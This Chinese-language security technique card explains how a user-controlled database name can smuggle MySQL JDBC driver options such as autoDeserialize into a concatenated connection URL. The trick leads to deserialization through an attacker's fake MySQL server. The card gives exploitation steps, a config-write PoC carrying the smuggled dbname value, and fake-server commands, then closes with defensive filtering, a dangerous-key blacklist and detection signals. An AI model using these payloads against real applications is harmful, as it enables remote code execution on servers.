---
id: web-java-deserialization-jdbc-dbname-url-param-smuggling-autodeserialize
title: 只可控 dbname 时的 JDBC URL 参数走私：把 query 串拼进库名覆盖 Properties 里的 allowLoadLocalInfile=false，走恶意 MySQL 服务端 autoDeserialize 反序列化
type: scenario
domain: web
path: web/java/deserialization
technique: jdbc-dbname-url-param-smuggling-autodeserialize
aliases:
- dbname 注入 JDBC 参数
- 库名拼接 URL query
- maxAllowedPacket 参数走私
- allowLoadLocalInfile 覆盖
- autoDeserialize 绕过属性设置
- detectCustomCollations 拼接
tags:
- java
- jdbc
- mysql
- deserialization
- url-parameter
- autodeserialize
- rce
- parameter-smuggling
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3
  verified_at: '2026-11-08T00:55:19+08:00'
  notes: '已对照原文与 21 张图核对：图05/06 显示 /RunCSByMySelf 写 /tmp/config.json，图06 中 cat config.json 出现的 dbname 为 test?maxAllowedPacket=655360&allowUrlInLocalInfile=true&detectCustomCollations=true&autoDeserialize=true，与卡内 PoC 逐字一致；图18 DatabaseConnect.connect 里 Properties 设 allowLoadLocalInfile/allowUrlInLocalInfile/allowLoadLocalInfileInPath=false、user=root、password=root，并 DriverManager.getConnection(this.url, properties)，而 this.url = jdbc:mysql://+ip+:+port+/+dbname（原文代码块），因此「Properties 只封 LOAD DATA、URL 参数仍可控」的论证与原文一致；图13/17/20 是 fake server 侧 usernamme: root / deser_CUSTOM / use custom gadget 的日志，图21 是目标环境报 Could not create connection to database server 未打通，卡内已在 PoC 结尾与边界如实记录。dedup：与 web-java-deserialization-mysql-jdbc-url-autodeserialize-rce 相似度 0.9235（likely_duplicate），但该卡前提是 URL 完全可控，本卡前提是只可控 dbname + 代码已显式设置 allowLoadLocalInfile=false，入口（配置写入接口→/tmp/config.json）与 PoC 不同，dup-scan.json 将该 pair 判为 related，故保留双卡并已互相链接，属于并行场景而非同一链。未验证点：未在本机执行 PoC，真实环境最后一步原文未打通（驱动/时区/端口映射原因未定）。'
---

## 一句话结论

当代码把用户可控的「库名」用字符串拼接成 `jdbc:mysql://ip:port/<dbname>` 并同时用 `Properties` 显式设置 `allowLoadLocalInfile=false`、`allowUrlInLocalInfile=false` 时，攻击者只要让库名变成 `test?maxAllowedPacket=...&allowUrlInLocalInfile=true&detectCustomCollations=true&autoDeserialize=true`，就能把这些驱动参数走私进 URL 的查询串，使驱动连接自己的恶意 MySQL 服务端并在查询结果反序列化处执行代码——代码里那几行「安全属性」只覆盖同名 key，拦不住 URL 内的其它驱动参数。

## 原理

- **URL 拼接把库名变成 query string**：`"jdbc:mysql://" + ip + ":" + port + "/" + dbname` 在 dbname 含 `?` 时，问号之后的部分整体被驱动当成连接属性（URL 的 `key=value&key=value` 段），而不再是库名。于是「只能控制库名」就等于「能设置任意驱动属性」。
- **Properties 与 URL 参数是两套来源**：`DriverManager.getConnection(url, properties)` 里 properties 只会提供 URL 中没出现的键（或不被 URL 覆盖的同名键按驱动实现合并）；URL 里显式写出的键由驱动自己解析。代码设的 `allowLoadLocalInfile=false`、`allowUrlInLocalInfile=false`、`allowLoadLocalInfileInPath=""` 只封住了 LOAD DATA LOCAL 这条路，对 `autoDeserialize`、`detectCustomCollations`、`maxAllowedPacket` 这些键完全没有约束。
- **autoDeserialize 的作用**：MySQL Connector/J 打开该属性后，对服务端返回的特定列做 Java 原生反序列化；配合 `detectCustomCollations=true`（5.1.x/6.x 在握手后查询 collation，结果集进入 `ResultSetImpl.getBytes/getObject` 一类路径）或 `queryInterceptors=ServerStatusDiffInterceptor`（8.x 的 SHOW SESSION STATUS），驱动会调用 `ObjectInputStream.readObject()` 处理攻击者服务端返回的数据。
- **服务端只需会说协议**：恶意 MySQL 服务端不必实现完整数据库，只需完成握手并在对应查询响应里塞入序列化字节；`maxAllowedPacket` 调大是为了让超长 payload 不被截断/拒绝。`user` 字段在 fake server 里常被当作选择 gadget 的标识（这也是很多工具要求 `user=deser_xxx` 的原因）。
- **为什么这是独立原子**：这一段的复用点不在 JDBC 反序列化本身，而在「把可控字段拼进 URL 就能跨过代码里硬编码的驱动安全参数」——同样的姿势可套到任何 `"jdbc:xxx://" + host + "/" + userInput` 的拼接上，只需要换成该驱动的危险参数名。

## 触发条件

- 应用用字符串拼接构造 JDBC URL，且至少有一个被拼接的片段（库名、schema、实例名、参数值）用户可控。
- 代码虽然设置了安全属性（如 `allowLoadLocalInfile=false`），但没有对 URL 拼接结果做白名单校验，也没有拒绝含 `?`、`&`、`=` 的片段。
- 目标驱动版本支持 `autoDeserialize` 且未被默认关闭（MySQL Connector/J 5.1.x/6.x/8.x 视版本而定；本场景目标使用 5.1.21 一类旧驱动）。
- 目标能出网访问攻击者的 MySQL 服务端；classpath 中有可用的反序列化 gadget（或目标自身有可用链）。
- 攻击者能控制写入配置的入口（本场景是一个只允许本机/特定路由调用的配置写入接口，写入 `/tmp/config.json` 的 ip/port/dbname）。

## 利用步骤

1. 找到拼接点：读代码确认 `this.url = "jdbc:mysql://" + ip + ":" + port + "/" + dbname`，且 `ip/port/dbname` 来自攻击者可写配置。
2. 先用正常库名（如 `test`）让应用连一次自己的服务端，确认能收到握手与后续查询（证明出口与触发路径可用）。
3. 把 dbname 改成带 query 的字符串：`test?maxAllowedPacket=655360&allowUrlInLocalInfile=true&detectCustomCollations=true&autoDeserialize=true`，写回配置。
4. 起恶意 MySQL 服务端（如 MySQL_Fake_Server / fake-mysql-gui），选择目标 classpath 匹配的 gadget 并设置命令；确认工具的 gadget 选择键与目标 URL 里的 `user` 值一致。
5. 触发应用重新建立连接（重启服务或调用会 new 连接的接口），让驱动连到恶意服务端。
6. 服务端在握手后的 collation / session status 响应中返回序列化对象，驱动 `readObject` 触发 gadget，命令执行。

## PoC

写入配置的请求（原文用 CS 脚本接口把 ip/port/dbname 写进 `/tmp/config.json`，`ScriptContent` 里是写入的 JSON 片段）：

```json
{
  "type": "&123",
  "data": {
    "ip": "127.0.0.1",
    "port": "50050",
    "username": "8889123",
    "password": "123456",
    "ListenerName": "test",
    "ScriptContent": "$data = \"{'ip':'ip','port':'3306','dbname':'test?maxAllowedPacket=655360&allowUrlInLocalInfile=true&detectCustomCollations=true&autoDeserialize=true'}\";$handle = openf(\">/tmp/config.json\");writeb($handle,$data);closef($handle);"
  }
}
```

最终落盘的 `/tmp/config.json`（原文 `cat config.json` 结果）：

```json
{"ip":"127.0.0.1","port":"3306","dbname":"test?maxAllowedPacket=655360&allowUrlInLocalInfile=true&detectCustomCollations=true&autoDeserialize=true"}
```

拼接后的实际 URL：

```text
jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&allowUrlInLocalInfile=true&detectCustomCollations=true&autoDeserialize=true
```

恶意服务端侧选择 custom gadget（原文 `user=root` + `deser_CUSTOM`，即先按 `user` 前缀/取值匹配再取 custom gadget 文件）：

```text
java -jar cli.jar -f test.txt        # 载入自定义 gadget（Base64 序列化数据）
fake-mysql-cli ... -u root ...        # 服务端日志：username: root, mode: deserialization, use custom gadget
```

PoC 未在本机执行；原文最后一步在真实环境上因 `Could not create connection to database server` 未打通（典型原因见变体与边界）。

## 变体与关联

- **可变字段**：`dbname` 之外，`ip`/`port` 同样可注入（如 port 写成 `3306/test?...`），或把整段 URL 交给用户（见关联卡）。有些驱动还接受 `;` 分隔的属性（SQL Server）或 `#` 之后被忽略的片段，可用于绕过只检查「库名不能含 ?」的弱校验。
- **不依赖 autoDeserialize**：同样走私 `allowLoadLocalInfile=true` + `allowUrlInLocalInfile=true` 可让恶意服务端用 LOAD DATA LOCAL INFILE 读服务器文件；走私 `socketFactory` 可加载任意类（另一条链）。
- **驱动版本差异**：5.1.x/6.x 用 `detectCustomCollations`，8.x 用 `queryInterceptors=...ServerStatusDiffInterceptor`；新版驱动默认关闭 `autoDeserialize`，需要确认目标版本。
- **关联**：[[web-java-deserialization-mysql-jdbc-url-autodeserialize-rce]]（URL 完全可控时的同一 sink）、[[web-java-deser-fastjson-mysql-jdbc-autodeserialize]]（入口换成 Fastjson 实例化连接类）、[[web-java-component-jdbc-duplicate-param-socketfactory-property-smuggling]]（同为「属性走私」，走私键是 socketFactory）、[[web-java-component-weaver-e10-addmysqlmonitor-jdbc-local-infile-read]]（同为 URL 可控 → 恶意服务端读取文件）。
- **边界**：目标不出网、驱动版本不支持该参数、URL 拼接前对库名做了 `?`/`&` 过滤、或 Properties 以「URL 参数优先」之外的方式覆盖时链不成立；原文真实环境未打通（报 `Could not create connection to database server`），复现时要重点核对驱动版本、时区参数与 port 映射。

## 检测与防御

- **代码侧**：禁止把用户输入拼进 JDBC URL；库名/schema 只允许 `[A-Za-z0-9_]`，出现 `?`、`&`、`=`、`;`、`#` 直接拒绝；连接参数用固定白名单的 `Properties`，并在建连后校验实际生效属性。
- **参数黑名单**：显式拒绝 `autoDeserialize`、`detectCustomCollations`、`queryInterceptors`、`socketFactory`、`allowLoadLocalInfile`、`allowUrlInLocalInfile` 等危险键（包括它们出现在库名位置的情况）。
- **网络**：数据库连接目标做主机白名单；应用服务器限制出网，尤其禁止连向非常规端口的 MySQL 服务。
- **检测信号**：JDBC URL 日志中出现 `?` 后跟驱动属性、库名含 `&`/`=`；进程主动连接陌生 3306 或高编号端口；驱动异常栈中出现 `ResultSetImpl.getBytes`/`ResultSetImpl.getObject` 与 `ObjectInputStream.readObject` 相邻；`mysql connector version` 握手日志出现在非预期时间点。
